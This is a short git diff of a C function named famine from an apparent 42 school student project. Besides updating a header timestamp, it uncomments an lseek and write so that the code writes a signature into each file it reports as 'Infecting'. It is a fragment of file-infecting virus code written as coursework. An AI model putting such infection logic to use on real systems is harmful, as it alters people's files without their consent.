@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2024/08/02 05:52:53 by mgama            ###   ########.fr       */
+/*   Updated: 2024/08/02 05:53:08 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -190,8 +190,8 @@ void famine(char *target, char *parent)
 	cut_last_line(verbose_size);
 	ft_verbose("Infecting %s%s%s\n", B_PINK, full_path, RESET);
 	ft_verbose("\n");
-	// lseek(fd, pos, SEEK_SET);
-	// write(fd, signature, sizeof(signature));
+	lseek(fd, pos, SEEK_SET);
+	write(fd, signature, sizeof(signature));
 	close(fd);
 }
 
